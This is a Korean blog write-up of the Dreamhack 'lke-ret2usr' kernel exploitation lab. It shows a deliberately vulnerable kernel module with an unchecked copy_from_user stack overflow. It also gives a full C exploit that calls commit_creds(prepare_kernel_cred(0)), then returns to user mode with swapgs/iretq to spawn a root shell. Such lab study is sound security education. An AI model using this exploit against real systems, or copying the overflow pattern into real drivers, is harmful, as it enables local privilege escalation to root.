---
title: Dreamhack - lke-ret2usr
categories:
 - pwnable
tags: kernel, ret2usr
---

  

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점			
- Reference

  
정말 오랜만에 포스팅을 진행하는 느낌은 기분탓입니다. ~~거의 다 기분탓이더라고요~~

아무튼 저번 주 부터 커널 익스를 공부하고 있는데 환경세팅때문에 진짜 너무 머리가 아프다.. 커널 익스보다 환경세팅에 더 오래 시간을 쓰는 느낌? 한 2:8정도로..?

처음이라 오래 걸리는거라 믿고 갑니다.. v8도 공부해야되고 웹이랑 리버싱도 해야되는데!! 집중해라 내 몸아..


# Introduction

*lke-ret2usr.mod.c*

```c
#include <linux/build-salt.h>
#include <linux/module.h>
#include <linux/vermagic.h>
#include <linux/compiler.h>
BUILD_SALT;
MODULE_INFO(vermagic, VERMAGIC_STRING);
MODULE_INFO(name, KBUILD_MODNAME);
__visible struct module __this_module
__section(.gnu.linkonce.this_module) = {
    .name = KBUILD_MODNAME,
    .init = init_module,
#ifdef CONFIG_MODULE_UNLOAD
    .exit = cleanup_module,
#endif
    .arch = MODULE_ARCH_INIT,
};
#ifdef CONFIG_RETPOLINE
MODULE_INFO(retpoline, "Y");
#endif
static const struct modversion_info ____versions[]
__used __section(__versions) = {
    { 0x9c9d8e06, "module_layout" },
    { 0x9905616d, "proc_remove" },
    { 0xc5850110, "printk" },
    { 0x431eb818, "proc_create" },
    { 0x13c49cc2, "_copy_from_user" },
    { 0xbdfb6dbb, "__fentry__" },
};
MODULE_INFO(depends, "");
```

*lke-ret2usr.c*

```c
/* Copyright (C) 2020  Theori Inc.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
/* pr_info() 등에서 사용할 커널 메시지 포맷을 정의합니다. */
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
#include <linux/kernel.h>  /* 리눅스 커널 타입 및 매크로 */
#include <linux/module.h>  /* 모듈 관련 타입 및 매크로 */
#include <linux/proc_fs.h> /* proc_create, file_operations, ... */
#include <linux/uaccess.h> /* _copy_from_user */
/* 사용자 모드 프로세스가 /proc/lke-ret2usr 파일에 쓰기 요청을
 * 보낼 때 이를 처리하기 위해 호출되는 함수입니다.
 *
 * @file:  쓰기 요청을 받은 FD의 파일 디스크립션을 나타내는 구조체입니다.
 * @buf:   파일에 쓰고자 하는 데이터를 저장하는 버퍼의 주소입니다.
 *         사용자 주소공간에 위치한 주소이며,
 *         직접 접근하는 대신 반드시 copy_from_user와 같은 함수를 사용하여
 *         먼저 커널 영역으로 복사한 후 사용하여야 합니다.
 * @count: 파일에 쓰고자 하는 데이터의 바이트 단위 크기입니다.
 * @ppos:  데이터가 씌어질 파일 내 위치를 저장하는 변수를 가리키는 포인터입니다.
 *         작업 완료 후 *ppos를 복사된 바이트수만큼 증가시키면,
 *         다음 write 호출에서 업데이트된 *ppos값이 다시 입력됩니다.
 *
 * 리턴값: 성공 시, 쓰여진 바이트 수를 반환합니다.
 *         실패 시, 음수 errno 값을 반환합니다. (예: -EIO)
 */
static ssize_t ret2usr_write(struct file *file, const char __user *buf,
             size_t count, loff_t *ppos)
{
    /* 커널 스택 버퍼를 할당합니다. */
    char kern_buf[256] = { 0, };
    /* 사용자로부터 전달받은 주소의 값을 커널 스택 버퍼로 복사합니다. */
    if (_copy_from_user(kern_buf, buf, count) != 0)
        return -EFAULT;
    /* 작업이 성공했음을 나타냅니다. */
    return count;
}
/* /proc/lke-ret2usr 파일 정보를 저장합니다. 모듈 언로드 시 사용됩니다. */
static struct proc_dir_entry *proc_r2u;
/* 파일을 정의할 때, 가능한 작업들에 대한 구현을 저장하는 구조체입니다. */
static const struct file_operations r2u_fops = {
    /* 소유자 커널 모듈을 나타내어, 파일이 열려 있는 동안에는
     * 모듈 탈착(unload)을 할 수 없도록 합니다. */
    .owner = THIS_MODULE,
    /* 파일 쓰기를 구현하는 함수의 포인터를 지정합니다.
     * 해당 파일에 write() 시스템 콜이 실행되면 이 함수가 호출됩니다. */
    .write = ret2usr_write,
};
/* 모듈 부착(load) 시 호출되는 함수입니다. */
int __init init_module(void)
{
    /* /proc/lke-ret2usr 파일을 등록합니다.
     *
     *   S_IWUGO: 모든 사용자가 쓰기 권한을 가지도록 합니다.
     * &r2u_fops: 파일을 대상으로 한 작업의 구현을 지정합니다.
     */
    proc_r2u = proc_create("lke-ret2usr", S_IWUGO, NULL, &r2u_fops);
    /* 운영체제 메모리가 부족하면 proc_create() 함수 호출이 실패합니다.
     * ENOMEM 오류 코드를 반환하여 사용자에게 이 상태를 통보합니다.
     */
    if (!proc_r2u)
        return -ENOMEM;
    /* 모듈 부착(load)이 성공하였다는 메시지를 출력합니다. */
    pr_info("loaded\n");
    /* 작업이 성공하였음을 나타냅니다. */
    return 0;
}
/* 모듈 탈착(unload) 시 호출되는 함수입니다. */
void __exit cleanup_module(void)
{
    /* 앞서 등록한 /proc/lke-ret2usr 파일을 시스템으로부터 등록 해제합니다. */
    proc_remove(proc_r2u);
    /* 모듈 탈착(unload)이 성공하였다는 메시지를 출력합니다. */
    pr_info("unloaded\n");
}
MODULE_LICENSE("GPL");  /* 모듈 사용 허가(license)를 명시합니다. */

```


# Vunlnerability

  
  문제의 유형은 이전 강의와 같이 스택 오버플로우로 진행된다.

   `/proc/lke-ret2usr` 를 write로 호출시키면 `ret2usr_write` 를 호출하게 된다.

  해당 함수는 더미 256바이트를 채워주고 fsp까지 덮어준 다음에 원하는 곳의 주소를 덮어주면 된다.

  ROP를 진행해도 되지만 이번에는 kernel code가 아닌 user code의 주소를 덮어서 공격자의 코드를 커널모드로 실행시키는 것을 목적으로 해당 익스를 진행한다.


# slv.c

  
```c
  #include <stdio.h>
  #include <stddef.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <string.h>
  #include <stdint.h>
  struct task_struct;
  struct cred;
  static struct cred *(*prepare_kernel_cred)(struct task_struct* daemon) = (void *)0xffffffff81081716;
  static int (*commit_creds)(struct cred *new) = (void *)0xffffffff8108157b;
  uint64_t dummy_stack[512] __attribute__((aligned(16)));
  void shell(void){
          system("/bin/sh");
          _exit(0);
  }
  void ret2usr(void){
          static struct trap_frame{
                  void *rip;
                  uint64_t cs;
                  uint64_t rflags;
                  void *rsp;
                  uint64_t ss;
          } tf = {
                  .rip = &shell,
                  .cs = 0x33,
                  .rflags = 0x202,
                  .rsp = dummy_stack+512,
                  .ss = 0x2b
          };
          volatile register uint64_t RSP asm("rsp");
          commit_creds(prepare_kernel_cred(0));
          RSP = (uint64_t)&tf;
          asm volatile(
                  "cli\n\t"
                  "swapgs\n\t"
                  "iretq"
                  :: "r" (RSP)
                  );
  }
  int main(){
          char payload[0x118];
          int fd = open("/proc/lke-ret2usr", O_WRONLY);
          if(fd<0){
                  perror("open");
                  return 0;
          }
          memset(payload, 'A', 0x110);
          *(uint64_t *)(payload+0x110) = (uint64_t)ret2usr;
          write(fd, payload, sizeof(payload));
          return 0;
  }

```

  그냥 ROP와 다른 점은 커널모드에서 커널 코드를 실행시키는 것이 아닌 일반 유저의 코드를 실행시켜야 되기 때문에 여러가지 환경을 설정해주지 않으면 커널패닉이 일어나 익스진행이 되지 않는다.

  먼저 커널모드에서 사용자모드로 전환하기 위해서 swapgs를 실행한 후 iret, retf, sysret, sysexit 중 하나를 실행해야된다. 여기 롸업에서는 iret으로 진행할 예정이고 다른 것들을 보고 싶으면 밑의 링크에서 확인하면 되겠다.

  [Dreamhack](https://dreamhack.io/learn/82#5)

  iret으로 모드를 전환할시 rip, rsp, rflags, cs, ss를 조정해줘야 되는데

  각각 shell, dummy_stack, 0x202, 0x33, 0x2b (64bit 기준) 으로 설정해주고 익스를 진행해 주면 된다.
  
  여기서 잠깐? gs는 저번에 한번 파헤쳐 봤었는데 32bit canary를 가져올때 사용하던 레지스터였는데 해당 관련된 부분은 좀더 보강해서 포스팅을 진행해야겠다..

  ...'21.01.20.(수)

  

# 느낀 점

빨리 최신 glibc, v8, kernel..

# Reference

[https://dreamhack.io/learn/82](https://dreamhack.io/learn/82)
